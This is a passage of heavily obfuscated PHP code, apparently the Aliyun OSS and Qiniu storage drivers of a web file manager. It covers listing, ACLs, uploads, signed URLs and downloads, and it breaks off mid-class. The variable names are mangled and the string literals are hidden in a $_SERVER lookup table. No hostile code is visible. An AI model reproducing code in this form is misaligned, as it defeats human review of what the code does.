(!$¨ÅŠêÇ€ || !$¨ÅŠêÇ€[$®¢í¥À[79]]) { continue; } $®òÉñ³[$®¢í¥À[79]] += $¨ÅŠêÇ€[$®¢í¥À[79]]; } } public function has($Ñæ”¤‡ô, $–ªæÌ”ˆ = false, $é‰…‰Ğ¿ = true) { $¼á­š¹º =& $_SERVER[Ş­ğŠìÒ]; $Ñæ”¤‡ô = trim($Ñæ”¤‡ô, $¼á­š¹º[8]); $—Ë÷İ°² = empty($Ñæ”¤‡ô) && $Ñæ”¤‡ô !== $¼á­š¹º[228] ? $¼á­š¹º[12] : $Ñæ”¤‡ô . $¼á­š¹º[8]; $¿ÄÚ¦„ü = $¼á­š¹º[12]; $‘û¨ÛÉà = 500; $ÀÂŠ²¯Ø = $›ç­™Ö¾ = 0; while (!0) { check_abort(); $¦“à¯š = array($¼á­š¹º[1467] => $¼á­š¹º[8], $¼á­š¹º[1468] => $—Ë÷İ°², $¼á­š¹º[1469] => $‘û¨ÛÉà, $¼á­š¹º[1470] => $¿ÄÚ¦„ü); try { $Ş¤¦äã = $this->client->listObjects($this->bucket, $¦“à¯š); } catch (OSS\Core\OssException $ãŒ£Ğ°) { $this->writeLog(__FUNCTION__ . $¼á­š¹º[214] . $ãŒ£Ğ°->getMessage()); break; } $¿ÄÚ¦„ü = $Ş¤¦äã->getNextMarker(); $›“»¬š = $Ş¤¦äã->getObjectList(); $â¸ñ™’ = $Ş¤¦äã->getPrefixList(); if ($–ªæÌ”ˆ) { if (count($›“»¬š) > 1 || count($›“»¬š) == 1 && $›“»¬š[0]->getKey() != $—Ë÷İ°²) { $ÀÂŠ²¯Ø += count($›“»¬š) - 1; } if (!empty($â¸ñ™’)) { $›ç­™Ö¾ += count($â¸ñ™’); } if ($¿ÄÚ¦„ü === $¼á­š¹º[12]) { break; } continue; } if ($é‰…‰Ğ¿) { if (!empty($›“»¬š)) { if (count($›“»¬š) > 1 || $›“»¬š[0]->getKey() != $—Ë÷İ°²) { return !0; } } } else { if (!empty($â¸ñ™’)) { return !0; } } if ($¿ÄÚ¦„ü === $¼á­š¹º[12]) { break; } } if ($–ªæÌ”ˆ) { return array($¼á­š¹º[239] => $ÀÂŠ²¯Ø, $¼á­š¹º[240] => $›ç­™Ö¾); } return !1; } public function listAll($Ôê–Ûû) { $Äêí£Â‰ =& $_SERVER[Ş­ğŠìÒ]; $îÒºªàÏ = $this->fileList($Ôê–Ûû, $Äêí£Â‰[12], !0); $ÛıòÛá = array_to_keyvalue($îÒºªàÏ[$Äêí£Â‰[86]], $Äêí£Â‰[32]); foreach ($îÒºªàÏ[$Äêí£Â‰[85]] as $Šò›Ô) { if (is_string($Šò›Ô)) { $ÛıòÛá[$Šò›Ô] = array($Äêí£Â‰[79] => 0); } } return $this->listAllFiles($Ôê–Ûû, $ÛıòÛá); } public function canRead($°Èô•ùÚ) { $ß®¹ƒÒ” =& $_SERVER[Ş­ğŠìÒ]; $æ¤ÕÕ¼ğ = $this->pathAcl($°Èô•ùÚ); return $æ¤ÕÕ¼ğ == $ß®¹ƒÒ”[1477] || $æ¤ÕÕ¼ğ == $ß®¹ƒÒ”[619] ? !0 : !1; } public function canWrite($­úË­•™) { $ŒˆïŒÙ = $this->pathAcl($­úË­•™); return $ŒˆïŒÙ == $_SERVER[Ş­ğŠìÒ][619] ? !0 : !1; } public function pathAcl($×€÷µß±) { $¶‘ÌæŸõ =& $_SERVER[Ş­ğŠìÒ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ò÷‹ã‘Â = $this->client->getObjectAcl($this->bucket, $this->pathEncode($×€÷µß±)); } catch (OSS\Core\OssException $Òšªê¢¤) { $this->writeLog(__FUNCTION__ . $¶‘ÌæŸõ[214] . $Òšªê¢¤->getMessage()); return !1; } $Ò×¨ı = $ò÷‹ã‘Â == $¶‘ÌæŸõ[37] ? $this->bucketAcl : $ò÷‹ã‘Â; if ($Ò×¨ı == $¶‘ÌæŸõ[1478]) { return $¶‘ÌæŸõ[1477]; } if ($Ò×¨ı == $¶‘ÌæŸõ[1479]) { return $¶‘ÌæŸõ[619]; } return $Ò×¨ı; } private function chmodPath($§‡“ƒú, $–Üı¯ó‘ = '') { $ñÍÃÅÃñ =& $_SERVER[Ş­ğŠìÒ]; $¶÷¿ßğù = empty($–Üı¯ó‘) ? $ñÍÃÅÃñ[1479] : $–Üı¯ó‘; $ıÑ”š = array($ñÍÃÅÃñ[37], $ñÍÃÅÃñ[229], $ñÍÃÅÃñ[1478], $ñÍÃÅÃñ[1479]); if (!in_array($¶÷¿ßğù, $ıÑ”š)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($§‡“ƒú), $¶÷¿ßğù); } catch (OSS\Core\OssException $—‚³ƒÕä) { $this->writeLog(__FUNCTION__ . $ñÍÃÅÃñ[214] . $—‚³ƒÕä->getMessage()); return !1; } return !0; } public function getContent($”ê„×—Ø) { return $this->fileSubstr($”ê„×—Ø, -1); } public function setContent($¶‚Äàªá, $¶æ¸¦„ = '') { $—‹É÷¿Ä =& $_SERVER[Ş­ğŠìÒ]; try { $°ï”¡¥“ = $this->trafficLimit($—‹É÷¿Ä[1480]); $ÊîĞ†¬§ = $this->client->putObject($this->bucket, $this->pathEncode($¶‚Äàªá), $¶æ¸¦„, $°ï”¡¥“); } catch (OSS\Core\OssException $âúÆ¥‹Â) { $this->writeLog(__FUNCTION__ . $—‹É÷¿Ä[214] . $âúÆ¥‹Â->getMessage()); return !1; } $†ÜüŒ‹ô = array($—‹É÷¿Ä[1474] => trim($ÊîĞ†¬§[$—‹É÷¿Ä[1471]], $—‹É÷¿Ä[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¶‚Äàªá))); $this->updateObjMeta($¶‚Äàªá, $†ÜüŒ‹ô); return isset($ÊîĞ†¬§[$—‹É÷¿Ä[1481]][$—‹É÷¿Ä[292]]) ? !0 : !1; } private function updateObjMeta($ÒøãòŸ„, $‰ì’‡) { $ÒøãòŸ„ = $this->pathEncode($ÒøãòŸ„); try { $Êëæİ† = array(OSS\OssClient::OSS_HEADERS => $‰ì’‡); $this->client->copyObject($this->bucket, $ÒøãòŸ„, $this->bucket, $ÒøãòŸ„, $Êëæİ†); } catch (OSS\Core\OssException $Ğ¸ëğêÀ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][214] . $Ğ¸ëğêÀ->getMessage()); return !1; } return !0; } public function upload($ƒáË¯°ƒ, $‰ôä¨ó«, $Ø‰†Õ‚­ = false, $¨€êÆ = REPEAT_REPLACE) { $â¿¥£Ä =& $_SERVER[Ş­ğŠìÒ]; $ò”§ûˆ = trim($ƒáË¯°ƒ, $â¿¥£Ä[8]); $¿Â°õØí = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($â¿¥£Ä[1474] => @md5_file($‰ôä¨ó«)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ƒáË¯°ƒ))); $¿Â°õØí = $this->trafficLimit($â¿¥£Ä[1480], $¿Â°õØí); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ò”§ûˆ), $‰ôä¨ó«, $¿Â°õØí); } catch (OSS\Core\OssException $ ¸Î¦æ) { $this->writeLog(__FUNCTION__ . $â¿¥£Ä[214] . $ ¸Î¦æ->getMessage()); return !1; } return $this->getPathOuter($ƒáË¯°ƒ); } public function getHost() { $ŸşÁÏ¿Æ =& $_SERVER[Ş­ğŠìÒ]; $ğ‘¾†¨ = explode($ŸşÁÏ¿Æ[210], parent::getHost()); return $ğ‘¾†¨[0] . $ŸşÁÏ¿Æ[210] . $this->bucket . $ŸşÁÏ¿Æ[10] . $ğ‘¾†¨[1]; } public function uploadFormData($æ§ùµ²‹, $ù¾ÆğØŞ = 3600) { $‡Şñô©ğ =& $_SERVER[Ş­ğŠìÒ]; if (!($úò¤øı› = $this->getHost())) { return !1; } $»š‹ÉÌœ = $ù¾ÆğØŞ; $Íøú«‡ = date($‡Şñô©ğ[1482], time() + $»š‹ÉÌœ); $î™©ç—Ğ = new DateTime($Íøú«‡); $¡Ì—“ûø = $î™©ç—Ğ->format(DateTime::ISO8601); $Ù„”ŸÄÂ = strpos($¡Ì—“ûø, $‡Şñô©ğ[372]); $¡Ì—“ûø = substr($¡Ì—“ûø, 0, $Ù„”ŸÄÂ) . $‡Şñô©ğ[1483]; $¾´³³øà = 1048576000 * 5; $í«àáÀ’ = $this->pathFather($æ§ùµ²‹); $ˆ•åë²È = array($‡Şñô©ğ[275] => $¡Ì—“ûø, $‡Şñô©ğ[278] => array(array($‡Şñô©ğ[1484], 0, $¾´³³øà), array($‡Şñô©ğ[281], $‡Şñô©ğ[282], $í«àáÀ’))); $Ú’¦æß… = base64_encode(json_encode($ˆ•åë²È)); $´öç£¢Ê = base64_encode(hash_hmac($‡Şñô©ğ[263], $Ú’¦æß…, $this->secret, !0)); $¯ËÇè¬ = array($‡Şñô©ğ[293] => $Ú’¦æß…, $‡Şñô©ğ[1485] => $this->accessKey, $‡Şñô©ğ[285] => $‡Şñô©ğ[274], $‡Şñô©ğ[1486] => $´öç£¢Ê, $‡Şñô©ğ[208] => $úò¤øı›); $¯ËÇè¬ = $this->trafficLimit($‡Şñô©ğ[1480], $¯ËÇè¬); return $¯ËÇè¬; } public function multiUploadFormData($é‚ªÚÉè, $³şüËª› = 3600) { $µµšõÊä =& $_SERVER[Ş­ğŠìÒ]; if (!($²¡¯Ø¹¬ = $this->getHost())) { return !1; } $äå¶ŒÂ¢ = $this->trafficLimit($µµšõÊä[1480]); $òå‘’ê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($é‚ªÚÉè), $äå¶ŒÂ¢); return array($µµšõÊä[254] => $òå‘’ê, $µµšõÊä[208] => $²¡¯Ø¹¬ . $µµšõÊä[8] . $this->pathEncode($é‚ªÚÉè), $µµšõÊä[255] => gmdate($µµšõÊä[1487]), $µµšõÊä[97] => $é‚ªÚÉè); } public function multiUploadAuthData($±ÒĞìÎÛ, $íÛÆİé = array()) { $ÎàÒºı =& $_SERVER[Ş­ğŠìÒ]; $¦«Û×’š = isset($íÛÆİé[$ÎàÒºı[255]]) ? $íÛÆİé[$ÎàÒºı[255]] : gmdate($ÎàÒºı[1487]); $¤ÚåÙ¿ = isset($íÛÆİé[$ÎàÒºı[169]]) ? $íÛÆİé[$ÎàÒºı[169]] : $ÎàÒºı[12]; $ôè²ùÒŸ = $±ÒĞìÎÛ; if (isset($íÛÆİé[$ÎàÒºı[97]])) { $ôè²ùÒŸ = $íÛÆİé[$ÎàÒºı[97]]; unset($íÛÆİé[$ÎàÒºı[97]]); } if (isset($íÛÆİé[$ÎàÒºı[256]])) { $íÛÆİé[$ÎàÒºı[255]] = $¦«Û×’š; return $this->listUploadParts($ôè²ùÒŸ, $íÛÆİé); } $áÙ¾Ş³í = array($ÎàÒºı[257], $ÎàÒºı[12], $ÎàÒºı[123], $¦«Û×’š, "\x78\x2d\157\163\x73\55\144\141\164\145\x3a{$¦«Û×’š}", $ÎàÒºı[8] . $this->bucket . $ÎàÒºı[8] . $ôè²ùÒŸ . $¤ÚåÙ¿); if (strpos($¤ÚåÙ¿, $ÎàÒºı[258]) === 0) { $áÙ¾Ş³í[0] = $ÎàÒºı[259]; if ($Œ¶ùÄÎÛ = $this->trafficLimit($ÎàÒºı[1480])) { $ôè²ùÒŸ = $ÎàÒºı[1488]; array_splice($áÙ¾Ş³í, 5, 0, $ôè²ùÒŸ . $ÎàÒºı[4] . $Œ¶ùÄÎÛ[$ôè²ùÒŸ]); } } if (isset($íÛÆİé[$ÎàÒºı[260]]) && $íÛÆİé[$ÎàÒºı[260]] == $ÎàÒºı[261]) { $áÙ¾Ş³í[0] = $ÎàÒºı[261]; } if (!empty($íÛÆİé[$ÎàÒºı[1489]])) { $îšš = array_merge(array($áÙ¾Ş³í[4]), $íÛÆİé[$ÎàÒºı[1489]]); sort($îšš); $áÙ¾Ş³í[4] = implode($ÎàÒºı[262], $îšš); } $™öúé¼Â = implode($ÎàÒºı[262], $áÙ¾Ş³í); $Ï—³×Å® = base64_encode(hash_hmac($ÎàÒºı[263], $™öúé¼Â, $this->secret, !0)); $Ì…í°›‚ = $ÎàÒºı[1457] . $this->accessKey . $ÎàÒºı[4] . $Ï—³×Å®; if (strpos($¤ÚåÙ¿, $ÎàÒºı[258]) === 0) { $Ì…í°›‚ = array($ÎàÒºı[265] => $Ì…í°›‚, $ÎàÒºı[255] => $¦«Û×’š); if ($Œ¶ùÄÎÛ) { $Ì…í°›‚ = array_merge($Ì…í°›‚, $Œ¶ùÄÎÛ); } } return $Ì…í°›‚; } public function listUploadParts($×—à©, $ÑÉÉ˜ƒÙ) { $Â¦áÈñ• =& $_SERVER[Ş­ğŠìÒ]; $â‡¹µÁ = parse_url_query($ÑÉÉ˜ƒÙ[$Â¦áÈñ•[169]]); $Î´‰ıåÒ = $this->client->listParts($this->bucket, $this->pathEncode($×—à©), $â‡¹µÁ[$Â¦áÈñ•[254]]); $é¯ß·•à = $Î´‰ıåÒ->getListPart(); $ç‹ì¤À  = array(); foreach ($é¯ß·•à as $î½¶À…à) { $ç‹ì¤À [] = array($Â¦áÈñ•[308] => $î½¶À…à->getPartNumber(), $Â¦áÈñ•[309] => trim($î½¶À…à->getETag(), $Â¦áÈñ•[121])); } unset($ÑÉÉ˜ƒÙ[$Â¦áÈñ•[256]], $ÑÉÉ˜ƒÙ[$Â¦áÈñ•[260]]); $­¸Ÿµ¯¿ = $this->multiUploadAuthData($×—à©, $ÑÉÉ˜ƒÙ); if (empty($­¸Ÿµ¯¿)) { return !1; } return array($Â¦áÈñ•[265] => $­¸Ÿµ¯¿, $Â¦áÈñ•[255] => $ÑÉÉ˜ƒÙ[$Â¦áÈñ•[255]], $Â¦áÈñ•[267] => $ç‹ì¤À ); } public function download($º‚¾ùúË, $ƒúµªò) { $ß…ÀİÇ¢ =& $_SERVER[Ş­ğŠìÒ]; if ($this->isFolder($º‚¾ùúË)) { return !1; } try { $‹Å¬ˆ‚ß = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ƒúµªò); $‹Å¬ˆ‚ß = $this->trafficLimit($ß…ÀİÇ¢[112], $‹Å¬ˆ‚ß); $this->client->getObject($this->bucket, $this->pathEncode($º‚¾ùúË), $‹Å¬ˆ‚ß); } catch (OSS\Core\OssException $±ÙµÏÊú) { $this->writeLog(__FUNCTION__ . $ß…ÀİÇ¢[214] . $±ÙµÏÊú->getMessage()); return !1; } return $ƒúµªò; } public function fileSubstr($áÜÍ˜¾, $ê¢§ÎÀÍ = 0, $©¯¸äŠ± = false) { if ($ê¢§ÎÀÍ === -1) { $É¶öÎ¹ƒ = array(); } else { if ($©¯¸äŠ± === !1) { $½£Â¨Ó… = $this->size($áÜÍ˜¾); } else { $½£Â¨Ó… = $ê¢§ÎÀÍ + $©¯¸äŠ± - 1; } $É¶öÎ¹ƒ = array(OSS\OssClient::OSS_RANGE => "{$ê¢§ÎÀÍ}\x2d{$½£Â¨Ó…}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($áÜÍ˜¾), $É¶öÎ¹ƒ); } catch (OSS\Core\OssException $í€áÛ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][214] . $í€áÛ->getMessage()); think_exception($í€áÛ->getMessage()); return !1; } } private function trafficLimit($…À…á®, $çÈ‰ª•ü = array()) { $ÏÏëô²» =& $_SERVER[Ş­ğŠìÒ]; if ($…À…á® == $ÏÏëô²»[1480] && $this->isUploadServer() || $…À…á® == $ÏÏëô²»[112] && $this->isFileOutServer()) { return $çÈ‰ª•ü; } $¢øŸÖŸâ = floatval($GLOBALS[$ÏÏëô²»[6]][$ÏÏëô²»[92]][$ÏÏëô²»[110]][$…À…á®]) * 1024 * 1024 * 8; if (!$¢øŸÖŸâ) { return $çÈ‰ª•ü; } $¢øŸÖŸâ = $¢øŸÖŸâ < 819200 ? 819200 : ($¢øŸÖŸâ > 838860800 ? 838860800 : $¢øŸÖŸâ); $çÈ‰ª•ü[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¢øŸÖŸâ); return $çÈ‰ª•ü; } public function link($Î¿âÕ—¦, $Õ•Ğ á­ = array()) { $„ËÉ¦İğ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->exist($Î¿âÕ—¦) || $this->isFolder($Î¿âÕ—¦)) { return !1; } try { $Õ•Ğ á­ = $this->trafficLimit($„ËÉ¦İğ[112], $Õ•Ğ á­); $Á¢¯Æñˆ = $this->client->signUrl($this->bucket, $this->pathEncode($Î¿âÕ—¦), 3600 * 12, $„ËÉ¦İğ[261], $Õ•Ğ á­); return $this->getCdnLink($Á¢¯Æñˆ); } catch (OSS\Core\OssException $ÖÇµßÎ) { $this->writeLog(__FUNCTION__ . $„ËÉ¦İğ[214] . $ÖÇµßÎ->getMessage()); return !1; } } public function fileOut($ˆ¥ô´Í, $ƒµ¦¢ÌË = false, $Í…ÖÖğ = false, $‘÷æÓ¿ù = '') { $†ˆğËµ· =& $_SERVER[Ş­ğŠìÒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ˆ¥ô´Í, $ƒµ¦¢ÌË, $Í…ÖÖğ, $‘÷æÓ¿ù); } if (!$Í…ÖÖğ) { $Í…ÖÖğ = $this->pathThis($ˆ¥ô´Í); } $Í…ÖÖğ = rawurlencode($Í…ÖÖğ); $„––şÇ… = get_file_mime(get_path_ext($Í…ÖÖğ)); if ($„––şÇ… == $†ˆğËµ·[248]) { return parent::fileOut($ˆ¥ô´Í, $ƒµ¦¢ÌË, $Í…ÖÖğ, $‘÷æÓ¿ù); } $ƒµ¦¢ÌË = $ƒµ¦¢ÌË ? $†ˆğËµ·[1490] : $†ˆğËµ·[1491]; $š‘‘å¡ = array(OSS\OssClient::OSS_SUB_RESOURCE => $†ˆğËµ·[1492] . rawurlencode("{$ƒµ¦¢ÌË}\73\x66\x69\154\x65\156\141\x6d\145\75{$Í…ÖÖğ}")); $š‘‘å¡[OSS\OssClient::OSS_SUB_RESOURCE] .= $†ˆğËµ·[1493] . rawurlencode($„––şÇ…); $ˆï¿×¸Ã = $this->link($ˆ¥ô´Í, $š‘‘å¡); $this->fileOutLink($ˆï¿×¸Ã); } public function fileOutServer($ŞìÈ¹³, $¡èÛÌÇ = false, $¦òØ—»‡ = false, $ÚÙ¥ˆ©— = '') { parent::fileOut($ŞìÈ¹³, $¡èÛÌÇ, $¦òØ—»‡, $ÚÙ¥ˆ©—); } public function fileOutImage($ÍÓÂœ£Ö, $§³óƒûİ = 250) { if ($this->size($ÍÓÂœ£Ö) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÍÓÂœ£Ö, $§³óƒûİ); } $ÔÙ á‹¯ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ş­ğŠìÒ][1454] . $§³óƒûİ); $‰Î÷Äµ¼ = $this->link($ÍÓÂœ£Ö, $ÔÙ á‹¯); $this->fileOutLink($‰Î÷Äµ¼); } public function fileOutImageServer($ı­¥‰ş±, $™É–ı…  = 250) { parent::fileOutImage($ı­¥‰ş±, $™É–ı… ); } public function fileOutLink($Ó­±é ¹) { $×ñº‚å° =& $_SERVER[Ş­ğŠìÒ]; if (!$this->isCdnHost() && substr($Ó­±é ¹, 0, 7) == $×ñº‚å°[313]) { $Ó­±é ¹ = $×ñº‚å°[314] . substr($Ó­±é ¹, 7); } header($×ñº‚å°[175] . $Ó­±é ¹); die; } public function hashMd5($¶í™‰, $Ã«ñŠğ = '') { $ğà±…½ =& $_SERVER[Ş­ğŠìÒ]; $üÄÒØ„ = $this->_objectMeta($¶í™‰); if (!$üÄÒØ„) { return $ğà±…½[12]; } if (!isset($üÄÒØ„[$ğà±…½[1474]]) && !empty($Ã«ñŠğ)) { $°ôœÎ»š = $this->updateObjMeta($¶í™‰, array($ğà±…½[1474] => $Ã«ñŠğ)); $üÄÒØ„[$ğà±…½[1474]] = $°ôœÎ»š ? $Ã«ñŠğ : $ğà±…½[12]; } return isset($üÄÒØ„[$ğà±…½[1474]]) ? strtolower($üÄÒØ„[$ğà±…½[1474]]) : $ğà±…½[12]; } public function size($ˆêÉİ) { $¤ş¯äë = $this->objectMeta($ˆêÉİ); return $¤ş¯äë ? $¤ş¯äë[$_SERVER[Ş­ğŠìÒ][79]] : 0; } public function info($¨©öôë) { if ($this->isFolder($¨©öôë)) { return $this->folderInfo($¨©öôë); } else { if ($this->isFile($¨©öôë)) { return $this->fileInfo($¨©öôë); } } return !1; } public function exist($‚·™°ˆà) { return $this->isFile($‚·™°ˆà) || $this->isFolder($‚·™°ˆà); } public function isFile($à²ÁÙ¦) { return !$this->isFolder($à²ÁÙ¦) && $this->objectMeta($à²ÁÙ¦); } public function isFolder($°áÉøû£) { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][179], $°áÉøû£); } protected function objectMeta($¡¨ŠÚî­) { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][181], $¡¨ŠÚî­); } protected function _objectMeta($Şö¥ĞÉ¦) { $Äíü±´± =& $_SERVER[Ş­ğŠìÒ]; try { $¾¢¡Ô‚ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Şö¥ĞÉ¦)); } catch (OSS\Core\OssException $êïõ‡Ó˜) { $this->writeLog(__FUNCTION__ . $Äíü±´±[214] . $êïõ‡Ó˜->getMessage()); $¾¢¡Ô‚ = !1; } if ($¾¢¡Ô‚) { $¾¢¡Ô‚[$Äíü±´±[79]] = intval($¾¢¡Ô‚[$Äíü±´±[1472]]); } return $¾¢¡Ô‚; } protected function _isFolder($ô¥˜ï­ª) { $ò´¤ÚËä =& $_SERVER[Ş­ğŠìÒ]; if ($ô¥˜ï­ª == $ò´¤ÚËä[12] || $ô¥˜ï­ª == $ò´¤ÚËä[8]) { return !0; } $´ ‡°¦ƒ = array($ò´¤ÚËä[1467] => $ò´¤ÚËä[8], $ò´¤ÚËä[1468] => rtrim($ô¥˜ï­ª, $ò´¤ÚËä[8]) . $ò´¤ÚËä[8], $ò´¤ÚËä[1469] => 1, $ò´¤ÚËä[1470] => $ò´¤ÚËä[12]); $âÈ»âè‡ = $this->client->listObjects($this->bucket, $´ ‡°¦ƒ); if ($âÈ»âè‡->getObjectList() || $âÈ»âè‡->getPrefixList()) { return !0; } return !1; } public function writeLog($ßá¯Ñİ = '', $¦ˆõ¨ğ¾ = false) { $ãşü¿ÆÒ =& $_SERVER[Ş­ğŠìÒ]; $é‹¸øîÀ = in_array(ACTION, array($ãşü¿ÆÒ[212], $ãşü¿ÆÒ[213])); if (!$é‹¸øîÀ && !GLOBAL_DEBUG) { return; } $ÏÎë‡ªÒ = 0; if (stripos($ßá¯Ñİ, $ãşü¿ÆÒ[1494]) !== !1) { $ÏÎë‡ªÒ = 1; $ÒƒµĞæË = explode($ãşü¿ÆÒ[1495], $ßá¯Ñİ); $ßá¯Ñİ = !empty($ÒƒµĞæË[1]) ? $ÒƒµĞæË[1] : $ßá¯Ñİ; } else { if (stripos($ßá¯Ñİ, $ãşü¿ÆÒ[1496])) { $ÏÎë‡ªÒ = 2; $ÒƒµĞæË = explode($ãşü¿ÆÒ[1496], $ßá¯Ñİ); $ÒƒµĞæË = explode($ãşü¿ÆÒ[4], $ÒƒµĞæË[0]); $ßá¯Ñİ = !empty($ÒƒµĞæË[1]) ? $ÒƒµĞæË[1] : $ßá¯Ñİ; } } if ($é‹¸øîÀ && I18n::getType() == $ãşü¿ÆÒ[1497]) { if ($ÏÎë‡ªÒ == 1) { $ßá¯Ñİ = str_replace($ãşü¿ÆÒ[1498], $ãşü¿ÆÒ[1499], $ßá¯Ñİ); } else { if ($ÏÎë‡ªÒ == 2) { $ÒƒµĞæË = explode($ãşü¿ÆÒ[214], $ÒƒµĞæË[0]); $Ùİô™ú‰ = isset($ÒƒµĞæË[1]) ? $ÒƒµĞæË[1] : $ãşü¿ÆÒ[12]; $±Å°¢ìÌ = array($ãşü¿ÆÒ[1500] => $ãşü¿ÆÒ[1501], $ãşü¿ÆÒ[1502] => $ãşü¿ÆÒ[1503], $ãşü¿ÆÒ[1504] => $ãşü¿ÆÒ[1505], $ãşü¿ÆÒ[1506] => $ãşü¿ÆÒ[1507], $ãşü¿ÆÒ[1508] => $ãşü¿ÆÒ[1509], $ãşü¿ÆÒ[1510] => $ãşü¿ÆÒ[1511], $ãşü¿ÆÒ[1512] => $ãşü¿ÆÒ[1513], $ãşü¿ÆÒ[1514] => $ãşü¿ÆÒ[1515], $ãşü¿ÆÒ[1516] => $ãşü¿ÆÒ[1517], $ãşü¿ÆÒ[1518] => $ãşü¿ÆÒ[1519]); if (isset($±Å°¢ìÌ[$Ùİô™ú‰])) { $ßá¯Ñİ = $±Å°¢ìÌ[$Ùİô™ú‰]; } } } if (stripos($ßá¯Ñİ, $ãşü¿ÆÒ[1520])) { $ßá¯Ñİ = $ãşü¿ÆÒ[1521]; } } if (!trim($ßá¯Ñİ)) { return; } parent::writeLog(trim($ßá¯Ñİ), $¦ˆõ¨ğ¾); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ù†Í³î–) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ş­ğŠìÒ][1522]; $this->_init($Ù†Í³î–); } public function _init($ŸÓÆŞğú) { $ìßÆéÇô =& $_SERVER[Ş­ğŠìÒ]; $this->config = $ŸÓÆŞğú; foreach ($ŸÓÆŞğú as $ƒƒ¦¤¯… => $¯İÃ¼ú£) { if (isset($this->{$ƒƒ¦¤¯…})) { $this->{$ƒƒ¦¤¯…} = $¯İÃ¼ú£; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ìßÆéÇô[1523] . LNG($ìßÆéÇô[1458])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($èâÃöç™, $¹ìÀ = '', $¤ßõÛ­º = REPEAT_RENAME) { if ($this->setContent($èâÃöç™, $¹ìÀ)) { return $this->getPathOuter($èâÃöç™); } return !1; } public function mkdir($ÉÎŞ‹Ï¼, $´—ß­ = REPEAT_SKIP) { $‚õã´‹Â =& $_SERVER[Ş­ğŠìÒ]; $¯‚…Šè = trim($ÉÎŞ‹Ï¼, $‚õã´‹Â[8]); if ($this->_isFolder($¯‚…Šè)) { return $this->getPathOuter($¯‚…Šè); } $ÉÎŞ‹Ï¼ = $¯‚…Šè . $‚õã´‹Â[8]; $ñÈ˜åÆó = get_path_this($¯‚…Šè); $ûäş±¥È = $ÉÎŞ‹Ï¼ . $ñÈ˜åÆó; if (!$this->mkfile($ûäş±¥È)) { return !1; } if (!$this->moveFile($ûäş±¥È, $ÉÎŞ‹Ï¼)) { $this->delFile($ûäş±¥È); return !1; } return $this->getPathOuter($¯‚…Šè); } public function copyFile($ßşÜ¥¡Ÿ, $½©îï§†) { $ÔÛÑúÚ = $this->bucketManager->copy($this->bucket, $ßşÜ¥¡Ÿ, $this->bucket, $½©îï§†, !0); return $ÔÛÑúÚ ? !1 : $this->getPathOuter($½©îï§†); } public function moveFile($ÛíñàëÓ, $“¯ùô©ì) { $¾ÈÙÅ¥æ = $this->bucketManager->move($this->bucket, $ÛíñàëÓ, $this->bucket, $“¯ùô©ì, !0); return $¾ÈÙÅ¥æ ? !1 : $this->getPathOuter($“¯ùô©ì); } public function delFile($ğòıÂÁ×) { if (!$this->exist($ğòıÂÁ×)) { return !0; } $Œä€“ô = $this->bucketManager->delete($this->bucket, $ğòıÂÁ×); return $Œä€“ô ? !1 : !0; } public function delFolder($Æ„ºŸıŒ) { $é§êµÌ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->exist($Æ„ºŸıŒ)) { return !0; } $this->listItemCache = !1; $×ÑÙ×ô÷ = $this->fileList($Æ„ºŸıŒ); $this->listItemCache = !0; $“èÂ€½î = trim($Æ„ºŸıŒ, $é§êµÌ[8]) . $é§êµÌ[8]; if (!empty($Æ„ºŸıŒ) && $Æ„ºŸıŒ !== $é§êµÌ[228] && !in_array($“èÂ€½î, $×ÑÙ×ô÷[$é§êµÌ[85]])) { $×ÑÙ×ô÷[$é§êµÌ[85]][] = $“èÂ€½î; } $½…¨ÔÆÄ = $this->delByBatch($×ÑÙ×ô÷[$é§êµÌ[86]]); if (!$½…¨ÔÆÄ) { return !1; } $½…¨ÔÆÄ = $this->delByBatch($×ÑÙ×ô÷[$é§êµÌ[85]]); if (!$½…¨ÔÆÄ) { return !1; } return $this->delFile($“èÂ€½î); } private function delByBatch($ŞÄŠÄÍì) { foreach (array_chunk($ŞÄŠÄÍì, 1000) as $¯è›¥µ) { $áèŒ“Ü§ = $this->bucketManager->buildBatchDelete($this->bucket, $¯è›¥µ); list($¶±øŠâ, $„¦°‹Ûµ) = $this->bucketManager->batch($áèŒ“Ü§); if ($„¦°‹Ûµ) { return !1; } } return !0; } public function rename($‚•ÄÌ±Ç, $¿Ûƒõäï) { return $this->renameObject($‚•ÄÌ±Ç, $¿Ûƒõäï); } public function fileInfo($ÖŒ›Û–, $¿‘ÉÂÃ¥ = false, $ËÆ°º¾è = array()) { $®ğ¢Á =& 